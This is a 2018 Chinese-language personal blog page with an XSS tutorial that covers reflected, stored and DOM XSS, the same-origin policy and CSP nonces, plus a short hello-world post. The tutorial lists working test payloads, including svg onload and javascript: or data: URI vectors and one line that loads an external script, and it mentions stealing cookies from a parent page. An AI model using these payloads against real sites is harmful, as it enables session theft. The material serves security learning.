<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>C0d3r1iu&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Keep Foolish">
<meta property="og:type" content="website">
<meta property="og:title" content="C0d3r1iu&#39;s Blog">
<meta property="og:url" content="http://c0der1iu.github.io/index.html">
<meta property="og:site_name" content="C0d3r1iu&#39;s Blog">
<meta property="og:description" content="Keep Foolish">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="C0d3r1iu&#39;s Blog">
<meta name="twitter:description" content="Keep Foolish">
  
    <link rel="alternate" href="/atom.xml" title="C0d3r1iu&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">C0d3r1iu&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">as do as learn</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://c0der1iu.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Explain-XSS" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/25/Explain-XSS/" class="article-date">
  <time datetime="2018-01-25T05:29:22.000Z" itemprop="datePublished">2018-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/25/Explain-XSS/">Explain-XSS</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h2 id="XSS-跨站脚本攻击漏洞-个人整理"><a href="#XSS-跨站脚本攻击漏洞-个人整理" class="headerlink" title="XSS 跨站脚本攻击漏洞 个人整理"></a>XSS 跨站脚本攻击漏洞 个人整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整体篇幅比较长，也算是我自己学习道路上的总结。</span><br><span class="line">大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~</span><br></pre></td></tr></table></figure>
<h3 id="一-攻击原理："><a href="#一-攻击原理：" class="headerlink" title="一.攻击原理："></a>一.攻击原理：</h3><p><img src="xss1.png" alt=""></p>
<p>设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等）</p>
<p>比如网页有一功能：某标签内的value引用一个用户输入的值，然而用户使用 “ 闭合value后面的赋值，接着后面输入onload=”alert(1) 又与value原本的第二个” 相结合，构造出一段额外的弹窗代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;xxx&quot; value=&quot; from_user_input &quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>当 用户输入” onfocus=”alert(1) 时变成了这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;xxx&quot; value=&quot;&quot; onfocus=&quot;alert(1) &quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p>value后面的值被双引号闭合，后面又构造出了一个on事件，从而执行攻击者自定义的操作</p>
<p>总的来说XSS基本流程是： 攻击者输入-&gt;网页输出-&gt; 受害者打开网页浏览中招</p>
<p><img src="xss.png" alt=""></p>
<h3 id="二-XSS类型分类："><a href="#二-XSS类型分类：" class="headerlink" title="二.XSS类型分类："></a>二.XSS类型分类：</h3><p>XSS可以大致分为两或三类:</p>
<h4 id="第一类："><a href="#第一类：" class="headerlink" title="第一类："></a>第一类：</h4><p>如果攻击payload存于url中，受害者需要访问特定携带payload的url才会中招，并且payload并不会入库即不会存储持续触发，则可以称此类型的XSS漏洞为反射型XSS<br>比如网页通过调用当前页面get传入的参数显示到页面中。<br>这类XSS最好防范，危险系数也相对较低，但存在数量较多，挖掘成本低</p>
<p>大致流程：访问页面进行构造闭合测试，查看源码或者F12使用开发者工具进行修改调试，能弹窗后进行cookie获取测试</p>
<p>值得一提的是：目前浏览器有自带filter过滤，除火狐浏览器，其他浏览器针对一般的XSS攻击payload已经有了自己的防范机制(放弃加载并警告用户)，为了bypass这一机制，需要进行特殊的编码构造，这又是一门学问。</p>
<h4 id="第二类："><a href="#第二类：" class="headerlink" title="第二类："></a>第二类：</h4><p>如果攻击payload可以入库，并且长期反应在某一页面中，受害者只要浏览了特定页面就会中招，则称此类型为储存型XSS。<br>这类XSS危害大，挖掘成本较高(需要目标站的提交数据权限)<br>大致流程:<br>通过修改个人资料或提交留言行为进行测试，一般提交一串xss sheet 或者自己觉得好用的payload，当弹框成功后再考虑构造进一步攻击。</p>
<p>根据构造闭合代码性质不同(html标签or页面JS代码)，还可分为普通XSS和Dom型XSS。</p>
<p>笔者曾经挖到过CNZZ个人管理页面的DOM储存型XSS，但是属于self-xss，即只有自己能中招的XSS（其他用户访问不到这个页面），如果不能结合CSRF漏洞则比较鸡肋,属于SRC混分行为。</p>
<h3 id="三-一些经典测试payload："><a href="#三-一些经典测试payload：" class="headerlink" title="三.一些经典测试payload："></a>三.一些经典测试payload：</h3><h5 id="笔者最喜欢用的payload是："><a href="#笔者最喜欢用的payload是：" class="headerlink" title="笔者最喜欢用的payload是："></a>笔者最喜欢用的payload是：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=alert(1)//</span><br></pre></td></tr></table></figure>
<p>当时拿着这段payload这插插那插插，一天就过去了，玩的不亦乐乎<br>现在想想，这段短小的payload伴随了我测试XSS漏洞的整个时光呢~</p>
<h5 id="具体引用外部js的代码姿势是"><a href="#具体引用外部js的代码姿势是" class="headerlink" title="具体引用外部js的代码姿势是:"></a>具体引用外部js的代码姿势是:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;js地址&apos;//</span><br></pre></td></tr></table></figure>
<p>在火狐浏览器下查看的效果(浏览器解析时会自动加上引号):</p>
<p><img src="svg.png" alt=""></p>
<h5 id="a标签伪协议执行"><a href="#a标签伪协议执行" class="headerlink" title="a标签伪协议执行"></a>a标签伪协议执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot; &gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h5 id="data引用外域资源"><a href="#data引用外域资源" class="headerlink" title="data引用外域资源"></a>data引用外域资源</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;base64,这里跟着base64之后的js代码&quot;&gt;click here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>外域获取cookie,据我所知只有火狐才可以了，这里涉及同源策略相关知识。</p>
<p>具体情况还需要具体分析，一定要记住 灵活构造 才是XSS最核心的东西</p>
<p>以上是黑盒测试我自己的基本流程</p>
<p>如果平时代码审计呢？</p>
<p>在PHP下我还真审计出来不少,基本操作还是那些，说一个记忆比较深刻的吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;PHP_SELF&apos;]</span><br></pre></td></tr></table></figure>
<p>这个PHP超全局变量如果作为输出显示到网页中，会提供当前url，<br>然而不少php环境下开启PATH_INFO，这种功能可以提供路径的形式传参<br>比如Wordpress提供生成静态链接方法，路径是index/article/001，其实这是给index.php传入 article 和 001两个参数，我们可以构造</p>
<p><code>http://url.cn/index/&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;/xxx/</code></p>
<p>来作为传入参数，这样显示的url也就包括了这一段payload<br>有趣的是，我在写上面代码的时候，我的markdown编辑器预览界面弹窗了233</p>
<h3 id="四-谈谈防护："><a href="#四-谈谈防护：" class="headerlink" title="四.谈谈防护："></a>四.谈谈防护：</h3><h5 id="SOP策略（同源策略）"><a href="#SOP策略（同源策略）" class="headerlink" title="SOP策略（同源策略）"></a>SOP策略（同源策略）</h5><p>源是主机，协议，端口名的一个三元组。</p>
<p>同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。注意：它仅仅是个模型</p>
<p>给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EX: http://a.url.cn/c0d3r1iu.html</span><br></pre></td></tr></table></figure></p>
<hr>
<p><a href="http://a.url.cn:80/marvel/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/marvel/c0d3r1iu.html</a> 同源<br><a href="http://a.url.cn:80/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/c0d3r1iu.html</a> 同源<br><a href="http://b.a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">http://b.a.url.cn/c0d3r1iu.html</a> 同源 (二级域相同的三级域名)<br><a href="https://a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://a.url.cn/c0d3r1iu.html</a> 不同源<br><a href="http://a.url.cn:88/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:88/c0d3r1iu.html</a> 不同源<br><a href="https://b.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://b.url.cn/c0d3r1iu.html</a> 不同源</p>
<hr>
<p>通过这些例子，大概能了解什么是同源了吧<br>同源策略只允许来自于同源的页面共享一些数据，比如cookie<br>如果没有同源策略，那浏览器就太不安全了，我们会面临访问任意网站都能跨域访问将你的社交网站的cookie共享，这将使得攻击者拿到你的网站管理权限如同探囊取物。</p>
<p>因此：</p>
<p>同源策略是由Netscape提出的一个著名的安全策略，现在所有支持JavaScript 的浏览器都会使用这个策略，一些网站认为自己设置了CSP（下一节）script:’self’ 就安全了，他们忘记了document.domain是可以修改的！</p>
<h5 id="CSP策略-内容安全策略"><a href="#CSP策略-内容安全策略" class="headerlink" title="CSP策略(内容安全策略)"></a>CSP策略(内容安全策略)</h5><p>CSP实际就是一个白名单，它通过设置http头的内容，告诉浏览器可以加载哪些外部资源，比如script，iframe的src可以指定哪些来源</p>
<h6 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h6><p>default-src 指定了下列所有的资源加载有效来源。</p>
<h6 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h6><p>定义了页面中Javascript的有效来源</p>
<h6 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h6><p>定义了页面中CSS样式的有效来源</p>
<h6 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h6><p>定义了页面中图片和图标的有效来源</p>
<h6 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h6><p>定义了字体加载的有效来源</p>
<h6 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h6><p>定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p>
<h6 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h6><p>指定定义了 web workers 以及嵌套的浏览上下文（如<frame>和<iframe>）的源。</iframe></p>
<p>关键字（必须要加单引号）</p>
<pre><code>&apos;none&apos;
代表空集；即不匹配任何 URL。
&apos;self&apos; url
代表和文档同源（详见上一节），包括相同的 URL 协议和端口号。
&apos;unsafe-inline&apos;
允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,不怎么安全（除非有设置nonce）
&apos;unsafe-eval&apos;
允许使用 eval() 等通过字符串创建代码的方法。
![](eval.png)
&apos;nonce-abc&apos;
标签内需要设定和上面相符的nonce值才会执行，google团队提出了一个新的思想，那就是随机化nonce,利用几行后端代码就可以指定nonce之后的值为随机生成的值，使得攻击难度剧增。
不过freebuf上有一篇翻译文章指出，这种情况在服务端开启了缓存的情况下还是可以被攻破：
[附上链接](http://www.freebuf.com/articles/web/133455.html)
</code></pre><p>如果后面空格跟上数据：<br>    data:<br>        允许data: URI作为内容来源。<br>    mediastream:<br>        允许mediastream: URI作为内容来源。</p>
<p>PS:如果要采用多种关键字，直接空格连接就OK</p>
<hr>
<p>做些小实验方便理解一些东西：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;&quot;&gt;</span><br><span class="line">&lt;script  nonce=&quot;ab&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script  nonce=&quot;abc&quot;&gt;alert(2)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>如果不加第一行，那么会弹窗1，2<br>但是加了CSP策略，只会弹出2，因为alert(1)所在的script标签nonce不符合策略要求</p>
<p>接下来通过一个XSS挑战例子说明：</p>
<p>我们设置如下内容安全策略来限制script加载的地址和iframe加载的地址：</p>
<p><img src="csp.png" alt=""></p>
<p>当我们试图在iframe将地址设置成 www.baidu.com 的时候，可以看到不会加载成功</p>
<p><img src="csp3.png" alt=""></p>
<p>如果我们换成符合设定CSP规则的，则可以加载成功</p>
<p><img src="csp2.png" alt=""></p>
<p>此乃内容安全策略，它限制了在当前网页Dom加载资源的来源</p>
<p>于是我们可以加载主域名相同的其他有XSS漏洞的站点来攻击这个站点</p>
<p>在嵌入的子页面执行攻击代码，通过top方法，获取父页面的document.cookie</p>
<h3 id="五-具体攻击实例-amp-参考文献："><a href="#五-具体攻击实例-amp-参考文献：" class="headerlink" title="五.具体攻击实例&amp;参考文献："></a>五.具体攻击实例&amp;参考文献：</h3><p>根据《网络安全法》，笔者不赘述具体攻击详细分析，可以自行去乌云网镜像网站搜索，学习。</p>
<p>推荐 “心伤的瘦子经典教程”，在这里向他以及消失的乌云致敬！</p>
<p>CSP策略部分参考链接：</p>
<p>Sakura2016简书：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p>
<p>阿里聚安全：<a href="http://jaq.alibaba.com/community/art/show?articleid=518" target="_blank" rel="noopener">http://jaq.alibaba.com/community/art/show?articleid=518</a></p>
<p>另附一个挑战赛：</p>
<p><a href="https://knock.xss.moe/index" target="_blank" rel="noopener">XSS千锤百炼挑战赛</a></p>
<p>学长推荐的，对于新手练习来说也算很不错了，涉及的知识点挺广的。之前忙于其他事情一直也没有把他打穿，然而学长们早都AK了orz，这几天尽量把它做完吧。。。</p>
<h3 id="六-后记-amp-防御"><a href="#六-后记-amp-防御" class="headerlink" title="六.后记&amp;防御"></a>六.后记&amp;防御</h3><p>XSS攻防好比灵活的舞蹈，需要天马行空的想象，大家加油！</p>
<p>我准备把相关防御和bypass的探讨放到下一篇，因为这一篇写的东西有点多，atom眼看就要崩溃了QAQ，下次再见 :p</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://c0der1iu.github.io/2018/01/25/Explain-XSS/" data-id="cjcvghbn400005qjxw0d1m3wk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS-跨站脚本攻击/">XSS 跨站脚本攻击</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/25/hello-world/" class="article-date">
  <time datetime="2018-01-24T17:03:38.350Z" itemprop="datePublished">2018-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/25/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>折腾了一整天，才把这新鲜的 “静态博客” 搭建好，期间经历的艰难困苦想必是大家无法想象的。</p>
<p>因为某些原因，我这里github和CSDN是不能访问的，在linux下克服这个问题，我用了proxychains4 这款神器，搭配“瑞士军刀” —— shadowsocks ，搞了个好点的vpn才算是解决了，然而解决之时，正好也是日落之时，这一天又这样悄悄的过去了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &apos;生活是屎一样的三明治，饥饿的你不得不去面对它！&apos;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://c0der1iu.github.io/2018/01/25/hello-world/" data-id="cjcvghbnh00015qjxu4og05zg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS-跨站脚本攻击/">XSS 跨站脚本攻击</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/XSS-跨站脚本攻击/" style="font-size: 10px;">XSS 跨站脚本攻击</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/01/25/Explain-XSS/">Explain-XSS</a>
          </li>
        
          <li>
            <a href="/2018/01/25/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 C0d3r1iu<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>